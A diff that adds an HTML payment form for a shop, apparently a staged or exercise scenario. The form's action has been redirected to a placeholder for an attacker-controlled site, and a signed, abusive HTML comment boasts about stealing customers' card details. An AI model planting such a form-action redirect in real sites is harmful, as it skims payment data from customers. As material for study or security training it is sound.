@@ -1,0 +1,60 @@
+
+<p>I see you've taken an interest in our fine wares and services. To complete the transaction, please submit your payment information below:</p>
+
+<section>
+<form id=payment method=POST action="http://(girugamesh-process-payment.php hosted on external, girugamesh-controlled site)"><!-- action="process-payment.php" -->
+<!--
+thought you could get away with stealing my shit, huh asshole?? shouldn't throw stones if you live in a glass house! by the time you find this, it'll be far too late. all your precious customers are gonna want your head impaled on a stick once I start putting these CC's to good use. enjoy the PCI audits dickhead!
+- Girugamesh
+-->
+
+    <fieldset>
+        <label for=name>Name:</label>
+        <input id=name name=name type=text placeholder="First and last name" required autofocus /><br>
+
+        <label for=email>Email:</label>
+        <input id=email name=email type=email placeholder="example@domain.com" required /><br>
+        
+        <label for=phone>Phone:</label>
+        <input id=phone name=phone type=tel placeholder="1-585-475-4316" required /><br>
+    </fieldset>
+    <fieldset>
+        <legend>Delivery address</legend>
+
+        <label for=address>Address</label>
+        <input id=address name=address placeholder="Office 2321, 152 Lomb Memorial Drive" required><br>
+
+        <label for=city>City</label>
+        <input id=city name=city type=text placeholder="Rochester" required><br>
+        
+        <label for=state>State</label>
+        <input id=state name=state type=text placeholder="New York" required><br>
+        
+        <label for=zip>Zip Code</label>
+        <input id=zip name=zip type=number placeholder="14623" required /><br>
+
+        <label for=country>Country</label>
+        <input id=country name=country type=text placeholder="United States" required /><br>
+    </fieldset>
+    <fieldset>
+        <legend>Card Details</legend>
+
+        <label for=cardtype>Card Type</label>
+        <select name=cardtype>
+            <option value="visa">Visa</option>
+            <option value="mastercard">MasterCard</option>
+            <option value="amex">American Express</option>
+        </select><br>
+        
+        <label for=cardnumber>Card Number</label>
+        <input id=cardnumber name=cardnumber type=number required /><br>
+
+        <label for=secure>Security Code</label>
+        <input id=secure name=secure type=number required /><br>
+
+        <label for=namecard>Name on Card</label>
+        <input id=namecard name=namecard type=text required /><br>
+    </fieldset>
+    <button type=submit>Submit</button>
+</form>
+</section>
